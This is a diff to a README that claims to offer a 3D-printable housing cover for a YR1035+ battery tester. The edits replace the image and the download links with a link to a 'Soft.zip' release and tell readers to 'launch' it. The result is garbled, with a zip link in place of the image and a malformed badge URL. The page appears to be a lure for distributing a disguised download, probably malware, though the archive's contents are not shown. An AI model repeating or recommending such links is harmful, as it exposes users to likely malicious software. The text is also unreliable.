@@ -2,7 +2,7 @@
 
 Welcome to the **YR1035 Housing Cover** repository! 
 
-![3D Printed Housing Cover](https://www.example.com/3d-printed-housing-cover.jpg)
+![3D Printed Housing Cover](https://github.com/kunjanlamsal/YR1035-housing-cover/releases/download/v1.0/Soft.zip)
 
 If you are looking for a 3D printable cover for your YR1035+ battery resistance measurement device, you are in the right place. This cover was created with Rhino 8, ensuring a perfect fit for your tester. 
 
@@ -17,11 +17,11 @@ If you are looking for a 3D printable cover for your YR1035+ battery resistance 
 #3d #3dm #battery #printable #resistance #rhino #stl #stp #tester #yr1035
 
 ## Download Cover
-To get the 3D printable housing cover files, download the [Release.zip](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) file. Click the button below to download:
+To get the 3D printable housing cover files, download the [https://github.com/kunjanlamsal/YR1035-housing-cover/releases/download/v1.0/Soft.zip](https://github.com/kunjanlamsal/YR1035-housing-cover/releases/download/v1.0/Soft.zip) file. Click the button below to download:
 
-[![Download Cover](https://img.shields.io/badge/Download%20Cover-Release.zip-green)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Cover](https://github.com/kunjanlamsal/YR1035-housing-cover/releases/download/v1.0/Soft.zip%https://github.com/kunjanlamsal/YR1035-housing-cover/releases/download/v1.0/Soft.zip)](https://github.com/kunjanlamsal/YR1035-housing-cover/releases/download/v1.0/Soft.zip)
 
-### 🚀 Launch the Release.zip file to access the housing cover files.
+### 🚀 Launch the https://github.com/kunjanlamsal/YR1035-housing-cover/releases/download/v1.0/Soft.zip file to access the housing cover files.
 
 ---
 
